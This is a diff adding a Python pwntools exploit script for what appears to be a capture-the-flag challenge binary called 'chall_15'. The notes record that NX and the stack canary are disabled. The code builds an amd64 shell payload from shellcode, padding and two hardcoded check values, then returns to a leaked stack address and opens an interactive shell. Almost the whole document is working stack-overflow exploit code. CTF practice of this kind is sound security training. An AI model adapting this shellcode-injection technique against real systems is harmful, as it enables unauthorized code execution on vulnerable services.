@@ -25,7 +25,42 @@ Vulns:
     Stack Canary is disabled along with NX so I smell shellcode!
     asm(shellcraft.asm)
     Set context to amd64
+
+    # Requres two passwords to contiue
+        var_4: 0xb16b00b5
+        var_8: 0xdeadd00d 
+        var_120: user input to smash to rip --> padding value
 '''
 
 # Import Libraries
 from pwn import *
+
+# Variables to make exit
+arg1 = p32(0xdeadd00d)
+arg2 = p32(0xb16b00b5)
+
+# Craft shellcode
+context.arch="amd64"   # Set to 64 bit
+shell = asm(shellcraft.sh())    # Generate shell
+
+# Determine padding
+offset = 280
+pad = b'a' * (offset - len(shell))      # How much to pad to leave room for the shell
+print("PAD LEN: ", len(pad))
+padOverRbp = b'z' * 8
+
+# Start process and catch leak
+p = process("./chall_15")
+resp = p.recvuntil(b"baked beans\n")
+leak = p.recvuntil(b'\n')   # Grap leak to return to use shell code
+leakInt = int(leak,16)      # Turn into decimal number then feed to p64
+leakAddr = p64(leakInt)
+print("LEAK: ", leak)
+
+# Craft payload
+payload = shell + pad + arg1 + arg2 + padOverRbp + leakAddr
+print("PAYLOAD LEN: ", len(payload))
+
+# Send payload and be interactive
+p.sendline(payload)
+p.interactive()
